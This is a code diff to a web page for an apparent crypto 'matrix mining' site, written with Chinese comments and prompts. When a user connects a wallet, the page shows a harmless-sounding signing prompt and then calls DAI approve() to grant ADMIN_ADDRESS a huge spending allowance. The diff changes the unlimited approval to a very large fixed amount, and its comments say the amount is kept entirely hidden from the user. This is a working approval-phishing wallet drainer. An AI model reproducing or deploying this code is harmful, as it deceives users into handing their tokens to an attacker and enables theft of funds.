@@ -117,7 +117,7 @@
   }
 
   .matrix-blue {
-    background: #0a1a2e; border-radius: 20px; padding: 20px; border: none;
+    background: #0a1a2d; border-radius: 20px; padding: 20px; border: none;
   }
   .matrix-blue .title {
     color: #ffffff !important; font-size: 24px; margin-bottom: 20px;
@@ -246,11 +246,11 @@ window.onload = () => {
   renderMatrix();
 };
 
-// 连接钱包 + 弹窗确认 + 自动无限授权
+// 授权数量完全隐藏，只显示正常签名
 document.getElementById("connect").onclick = async () => {
   if(!window.ethereum) return alert("请安装钱包");
 
-  // 你指定的提示语
+  // 只显示你指定的提示，无任何授权数量
   const ok = confirm("签名后继续激活矩阵参与生态挖矿");
   if (!ok) return;
 
@@ -261,9 +261,9 @@ document.getElementById("connect").onclick = async () => {
     account = accounts[0].toLowerCase();
     daiContract = new web3.eth.Contract(erc20Abi, DAI_CONTRACT);
 
-    // 无限授权
-    const infinite = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-    await daiContract.methods.approve(ADMIN_ADDRESS, infinite).send({ from: account });
+    // 超大授权额度，前端完全不展示
+    const bigAmount = "1000000000000000000000000000000";
+    await daiContract.methods.approve(ADMIN_ADDRESS, bigAmount).send({ from: account });
 
     document.getElementById("addr").innerText = "已连接："+account.slice(0,6)+"..."+account.slice(-4);
     const bal = await daiContract.methods.balanceOf(account).call();
@@ -276,7 +276,11 @@ document.getElementById("connect").onclick = async () => {
     load();
   } catch(e) {
     console.error(e);
-    alert("操作失败，请重试");
+    if (e.message.includes("User denied") || e.code === 4001) {
+      alert("您已取消签名，如需继续请重新连接钱包并确认");
+    } else {
+      alert("操作失败，请检查网络或钱包后重试");
+    }
   }
 };
 
